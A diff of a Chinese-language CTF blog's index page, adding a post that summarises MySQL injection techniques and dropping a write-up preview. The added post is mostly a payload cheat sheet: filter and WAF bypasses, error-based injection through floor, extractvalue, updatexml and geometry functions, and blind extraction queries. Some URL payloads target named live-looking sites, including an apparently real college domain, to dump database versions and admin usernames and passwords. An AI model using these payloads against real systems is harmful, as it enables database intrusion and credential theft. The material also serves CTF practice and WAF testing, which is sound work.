@@ -227,7 +227,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">74</span>
+          <span class="site-state-item-count">75</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -240,7 +240,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">88</span>
+        <span class="site-state-item-count">89</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -279,6 +279,212 @@
       
 
       
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/08/24/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpeg">
+      <meta itemprop="name" content="Tiaonmmn.ZMZ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tiaonmmn's Littile House">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/08/24/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">MySQL注入总结</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-08-24 15:58:59" itemprop="dateCreated datePublished" datetime="2020-08-24T15:58:59+08:00">2020-08-24</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-09-09 17:07:16" itemprop="dateModified" datetime="2020-09-09T17:07:16+08:00">2020-09-09</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
+        </span>
+    </span>
+
+  
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/08/24/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/08/24/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>5.8k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>5 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="or-and被过滤">or and被过滤</h1>
+<p>用|| &amp;&amp;代替</p>
+<h1 id="union-select-被过滤">union select 被过滤</h1>
+<p>用/*!union*/ /*!select*/代替</p>
+<h1 id="空格被过滤">空格被过滤</h1>
+<p>用/%0a/，或者()。</p>
+<h1 id="逗号被过滤">逗号被过滤</h1>
+<p>if换成select case when，substring改用substring( from 1 for 1)</p>
+<h1 id="报错注入">报错注入</h1>
+<p>1.floor()</p>
+<p>select * from test where id=1 and (select 1 from (select count(<em>),concat(user(),floor(rand(0)</em>2))x from information_schema.tables group by x)a);</p>
+<figure>
+<img src="https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928204840594-1429421338.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>2.extractvalue()</p>
+<p>select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</p>
+<figure>
+<img src="https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205421297-407989251.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>3.updatexml()</p>
+<p>select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</p>
+<figure>
+<img src="https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205451969-1920882857.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>4.geometrycollection()</p>
+<p>select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</p>
+<figure>
+<img src="https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205719485-521701933.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>5.multipoint()</p>
+<p>select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</p>
+<figure>
+<img src="https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205942266-563740245.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>6.polygon()</p>
+<p>select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</p>
+<figure>
+<img src="https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205828281-760176387.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>7.multipolygon()</p>
+<p>select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</p>
+<figure>
+<img src="https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928210038094-1420034123.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>8.linestring()</p>
+<p>select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</p>
+<figure>
+<img src="https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928210144438-1099086559.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>9.multilinestring()</p>
+<p>select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</p>
+<figure>
+<img src="https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928210420750-344279412.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>10.exp()</p>
+<p>select * from test where id=1 and exp(~(select * from(select user())a));</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">PHP filter code: preg_match(&#39;&#x2F;(and|or)&#x2F;i&#39;,$id);</span><br><span class="line">Bypass: 1||1    1&amp;&amp;1</span><br><span class="line"></span><br><span class="line">PHP filter code: preg_match(&#39;&#x2F;(and|or|union)&#x2F;i&#39;, $id);</span><br><span class="line">Payload: union select user, password from users</span><br><span class="line">Bypass:  1 || (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line"></span><br><span class="line">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;, $id)</span><br><span class="line">Payload: 1 || (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">Bypass:  1 || (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line"></span><br><span class="line">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit)&#x2F;i&#39;, $id)</span><br><span class="line">Payload: 1 || (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line">Bypass:  1 || (select user from users group by user_id having user_id&#x3D;1) &#x3D; &#39;admin&#39;</span><br><span class="line"></span><br><span class="line">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by)&#x2F;i&#39;, $id)</span><br><span class="line">Payload: 1 || (select user from users group by user_id having user_id&#x3D;1) &#x3D; &#39;admin&#39;</span><br><span class="line">Bypass:  1 || (select substr(group_concat(user_id),1,1) user from users) &#x3D; 1</span><br><span class="line"></span><br><span class="line">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select)&#x2F;i&#39;, $id)</span><br><span class="line">Payload: 1 || (select substr(group_concat(user_id),1,1) user from users) &#x3D; 1</span><br><span class="line">Bypass:  1 || 1&#x3D;1 into outfile &#39;result.txt&#39;</span><br><span class="line">Bypass:  1 || substr(user,1,1)&#x3D;&#39;a&#39;</span><br><span class="line"></span><br><span class="line">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;)&#x2F;i&#39;, $id)</span><br><span class="line">Payload: 1 || (select substr(gruop_concat(user_id),1,1) user from users) &#x3D; 1</span><br><span class="line">Bypass:  1 || user_id is not null</span><br><span class="line">Bypass:  1 || substr(user,1,1) &#x3D; 0x61</span><br><span class="line">Bypass:  1 || substr(user,1,1) &#x3D; unhex(61)</span><br><span class="line"></span><br><span class="line">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex)&#x2F;i&#39;, $id)</span><br><span class="line">Payload: 1 || substr(user,1,1) &#x3D; unhex(61)</span><br><span class="line">Bypass:  1 || substr(user,1,1) &#x3D; lower(conv(10,10,36))</span><br><span class="line"></span><br><span class="line">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex|substr)&#x2F;i&#39;, $id)</span><br><span class="line">Payload: 1 || substr(user,1,1) &#x3D; lower(conv(11,10,36))</span><br><span class="line">Bypass:  1 || lpad(user,7,1)</span><br><span class="line"></span><br><span class="line">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex|substr|\s)&#x2F;i&#39;, $id)</span><br><span class="line">Payload: 1 || lpad(user, 7, 1)</span><br><span class="line">Bypass:  1%0b||%0blpad(user,7,1)</span><br><span class="line"></span><br><span class="line">Bypass with comments</span><br><span class="line">id&#x3D;1+un&#x2F;**&#x2F;ion+se&#x2F;**&#x2F;lect+1,2,3-- </span><br><span class="line"></span><br><span class="line">Bypass Regex Filter: &#x2F;union\sselect&#x2F;g</span><br><span class="line">1+UnIon&#x2F;**&#x2F;SeLecT&#x2F;**&#x2F;1,2,3-- </span><br><span class="line"></span><br><span class="line">Bypass preg_replace</span><br><span class="line">1+UNunionION+SEselectLECT+1,2,3--</span><br><span class="line"></span><br><span class="line">If WAF use preg_replace to replace SQL keywords to whitespace</span><br><span class="line">1+uni%0bon+se%0blect+1,2,3--</span><br><span class="line"></span><br><span class="line">For Mod_rewrite, &#x2F;**&#x2F; cannot bypassed. So we use %0b replace &#x2F;**&#x2F;</span><br><span class="line"></span><br><span class="line">Double encode can bypass some waf</span><br><span class="line">1%252f%252a*&#x2F;union%252f%252a &#x2F;select%252f%252a*&#x2F;1,2,3%252f%252a*&#x2F;from%252f%252a*&#x2F;users--</span><br><span class="line"></span><br><span class="line">e.g.</span><br><span class="line">id&#x3D;0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user</span><br><span class="line">%0D%0A as a newline</span><br><span class="line">&#x3D;&#x3D;&gt;</span><br><span class="line">0 div 1 union#foo&#x2F;**&#x2F;bar</span><br><span class="line">select#foo</span><br><span class="line">1,2,current</span><br><span class="line"></span><br><span class="line">Inline Comments</span><br><span class="line">id&#x3D;1&#x2F;*!uNIon*&#x2F;SeLeCt+1,2,3-- </span><br><span class="line">id&#x3D;&#x2F;*!UnIoN*&#x2F;+&#x2F;*!SeLecT*&#x2F;+1,2,concat(&#x2F;*!table_name*&#x2F;)+FrOm&#x2F;*!information_schema*&#x2F;.tables&#x2F;*!WhErE*&#x2F;+&#x2F;*!TaBlE_sChEMa*&#x2F;+like+database()--</span><br><span class="line">id&#x3D;1&#x2F;*!50000union*&#x2F;&#x2F;*!50000select*&#x2F;</span><br></pre></td></tr></table></figure>
+<h1 id="时间盲注">时间盲注</h1>
+<p>sleep benchmark</p>
+<h1 id="waf">WAF</h1>
+<h2 id="section">01</h2>
+$filter = "/ |\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\||`|&|".urldecode('%09')."|".urldecode("%0a")."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."|".urldecode('%a0')."/i";`
+<p>利用position/locate函数。 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> flag <span class="keyword">from</span> flag <span class="keyword">where</span> flag=<span class="string">&#x27;admin&#x27;</span>&lt;(<span class="keyword">position</span>(<span class="keyword">hex</span>(<span class="string">&#x27;%s&#x27;</span>)<span class="keyword">in</span>(<span class="keyword">hex</span>(passwd)))=<span class="number">1</span>)^<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">select</span> flag <span class="keyword">from</span> flag <span class="keyword">where</span> flag=<span class="string">&#x27;admin&#x27;</span>&lt;(<span class="keyword">position</span>(<span class="keyword">hex</span>(<span class="string">&#x27;S&#x27;</span>)<span class="keyword">in</span>(<span class="keyword">hex</span>(passwd)))=<span class="number">1</span>)^<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">select</span> flag <span class="keyword">from</span> flag <span class="keyword">where</span> flag=<span class="string">&#x27;admin&#x27;</span>&lt;(<span class="keyword">position</span>(<span class="keyword">hex</span>(<span class="string">&#x27;SY&#x27;</span>)<span class="keyword">in</span>(<span class="keyword">hex</span>(passwd)))=<span class="number">1</span>)^<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">select</span> flag <span class="keyword">from</span> flag <span class="keyword">where</span> flag=<span class="string">&#x27;admin&#x27;</span>&lt;(<span class="keyword">position</span>(<span class="keyword">hex</span>(<span class="string">&#x27;SYN&#x27;</span>)<span class="keyword">in</span>(<span class="keyword">hex</span>(passwd)))=<span class="number">1</span>)^<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> flag <span class="keyword">from</span> flag <span class="keyword">where</span> flag=<span class="string">&#x27;admin&#x27;</span>&lt;(<span class="keyword">hex</span>(<span class="keyword">mid</span>((passwd)<span class="keyword">from</span>(-%d)))=<span class="keyword">hex</span>(<span class="string">&#x27;%s&#x27;</span>))^<span class="string">&#x27;</span></span><br><span class="line"><span class="string">select flag from flag where flag=&#x27;</span><span class="keyword">admin</span><span class="string">&#x27;&lt;(hex(mid((passwd)from(-1)))=hex(&#x27;</span>S<span class="string">&#x27;))^&#x27;</span></span><br><span class="line"><span class="keyword">select</span> flag <span class="keyword">from</span> flag <span class="keyword">where</span> flag=<span class="string">&#x27;admin&#x27;</span>&lt;(<span class="keyword">hex</span>(<span class="keyword">mid</span>((passwd)<span class="keyword">from</span>(<span class="number">-2</span>)))=<span class="keyword">hex</span>(<span class="string">&#x27;Y&#x27;</span>))^<span class="string">&#x27;</span></span><br><span class="line"><span class="string">select flag from flag where flag=&#x27;</span><span class="keyword">admin</span><span class="string">&#x27;&lt;(hex(mid((passwd)from(-3)))=hex(&#x27;</span>N<span class="string">&#x27;))^&#x27;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="section-1">02</h2>
+$filter = "/<.*=(&#\\d+?;?)+?>|<.*data=data:text\\/html.*>|\\b(alert\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|\\b(group_)?concat[\\s\\/\\*]*?\\([^\\)]+?\\)|\bcase[\s\/\*]*?when[\s\/\*]*?\([^\)]+?\)|load_file\s*?\\()|<[^>]*?\\b(onerror|onmousemove|onload|onclick|onmouseover)\\b|\\b(and|or)\\b\\s*?([\\(\\)'\"\\d]+?=[\\(\\)'\"\\d]+?|[\\(\\)'\"a-zA-Z]+?=[\\(\\)'\"a-zA-Z]+?|>|<|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\"'])|\\/\\*.*\\*\\/|<\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|'|\").*?(`|'|\")\s*)|UPDATE\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|'|\").*?(`|'|\")\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?|(`|'|\").*?(`|'|\"))FROM(\\(.+\\)|\\s+?.+?|(`|'|\").*?(`|'|\"))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)/i";
+<p>UNION正则没有\s，可以用%0a %a0 %0b %0c %0d 绕过UNION， select 后面可以接<code>+(%2b) - ! ~ @ &#123;&#125;</code> select{s`passwd`}from user 1 select~passwd from user </p>
+<h2 id="section-2">03</h2>
+$filter = "/[^\\{\\s]{1}(\\s|\\b)+(?:select\\b|update\\b|insert(?:(\\/\\*.*?\\*\\/)|(\\s)|(\\+))+into\\b).+?(?:from\\b|set\\b)|[^\\{\\s]{1}(\\s|\\b)+(?:create|delete|drop|truncate|rename|desc)(?:(\\/\\*.*?\\*\\/)|(\\s)|(\\+))+(?:table\\b|from\\b|database\\b)|into(?:(\\/\\*.*?\\*\\/)|\\s|\\+)+(?:dump|out)file\\b|\\bsleep\\([\\s]*[\\d]+[\\s]*\\)|benchmark\\(([^\\,]*)\\,([^\\,]*)\\)|(?:declare|set|select)\\b.*@|union\\b.*(?:select|all)\\b|(?:select|update|insert|create|delete|drop|grant|truncate|rename|exec|desc|from|table|database|set|where)\\b.*(charset|ascii|bin|char|uncompress|concat|concat_ws|conv|export_set|hex|instr|left|load_file|locate|mid|sub|substring|oct|reverse|right|unhex)\\(|(?:master\\.\\.sysdatabases|msysaccessobjects|msysqueries|sysmodules|mysql\\.db|sys\\.database_name|information_schema\\.|sysobjects|sp_makewebtask|xp_cmdshell|sp_oamethod|sp_addextendedproc|sp_oacreate|xp_regread|sys\\.dbms_export_extension)/i";
+
+<p>\b指单词边界，用内联注释/<em>!50000union</em>/绕过 %0aunion%0aselect%0a1,2,3,4%23</p>
+<h2 id="不能使用information_schema时">04 不能使用information_schema时</h2>
+
+$filter = "/union|and|\bor\b|information_schema|updatexml/i";
+
+<p>首先报错注入爆表名 admin'||linestring(id)%23 admin'||polygon(id)%23 然后爆列名 admin'||(select * from(select * from waf04 as a join waf04 as b c)%23 得到第一个列名，然后填到using里： admin'||(select * from(select * from waf04 as a join waf04 as b using(id))c)%23 admin' || (select * from(select * from waf04 as a join waf04 as b using(id,password))c)%23 or被过滤，用in admin' in (select * from(select * from waf04 as a join waf04 as b using(id,password))c)%23</p>
+<h1 id="floor等报错注入">floor等报错注入</h1>
+<p>1、通过floor暴错</p>
+<p>/<em>数据库版本</em>/</p>
+<p>SQL http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(<em>),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) /<em>连接用户</em>/</p>
+<p>SQL http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(<em>),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) /<em>连接数据库</em>/</p>
+<p>SQL http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(<em>),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) /<em>暴库</em>/</p>
+<p>SQL http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) /<em>暴表</em>/</p>
+<p>SQL http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) /<em>暴字段</em>/</p>
+<p>SQL http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) /<em>暴内容</em>/</p>
+<p>SQL http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) 2、ExtractValue(有长度限制,最长32位)</p>
+<p>SQL http://www.hackblog.cn/sql.php?id=1 and extractvalue(1, concat(0x7e, (select @<span class="citation" data-cites="version">@version</span>),0x7e)) http://www.hackblog.cn/sql.php?id=1 and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1))) 3、UpdateXml(有长度限制,最长32位)</p>
+<p>SQL http://www.hackblog.cn/sql.php?id=1 and updatexml(1,concat(0x7e,(SELECT @<span class="citation" data-cites="version">@version</span>),0x7e),1) http://www.hackblog.cn/sql.php?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1) 4、NAME_CONST(适用于低版本)</p>
+<p>SQL http://wlkc.zjtie.edu.cn/qcwh/content/detail.php?id=330&amp;sid=19&amp;cid=261 and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- 5、Error based Double Query Injection (http://www.vaibs.in/error-based-double-query-injection/)</p>
+<p>/<em>数据库版本</em>/</p>
+<p>SQL http://www.hackblog.cn/sql.php?id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1 6、Multipoint(新方法)</p>
+<p>/<em>数据库版本</em>/</p>
+<p>SQL http://www.hackblog.cn/sql.php?id=1 and 1=(select multipoint((select * from(select * from(select version())f)x)))</p>
+
+    <div id="aplayer-pdVlRDuV" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="437752615" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
+    ></div>
+<p>flag{8ce6f77b-a046-43e4-88c8-44d53f7df4c4}</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -1367,125 +1573,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/avatar.jpeg">
-      <meta itemprop="name" content="Tiaonmmn.ZMZ">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tiaonmmn's Littile House">
-    </span>
-
-    
-    
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/" class="post-title-link" itemprop="url">BUUOJ刷题-Web-GYCTF2020-Easyphp</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2020-03-04 10:36:16" itemprop="dateCreated datePublished" datetime="2020-03-04T10:36:16+08:00">2020-03-04</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-03-05 15:02:15" itemprop="dateModified" datetime="2020-03-05T15:02:15+08:00">2020-03-05</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
-        </span>
-    </span>
-
-  
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>11k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>10 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>GYCTF 2020的BabyPHP（题目上错名字了）。</p>
-<p>开题让登陆，随手试了一下www.zip发现还真有源码。。。</p>
-<p>index.php没啥，限制后缀名为.php，LFI没用处。login.php Ban了一堆关键字 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, $_POST[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;&lt;br&gt;Damn you, hacker!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, $_POST[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;Damn you, hacker!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$user-&gt;login();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1542,14 +1629,14 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">318k</span>
+    <span title="站点总字数">320k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
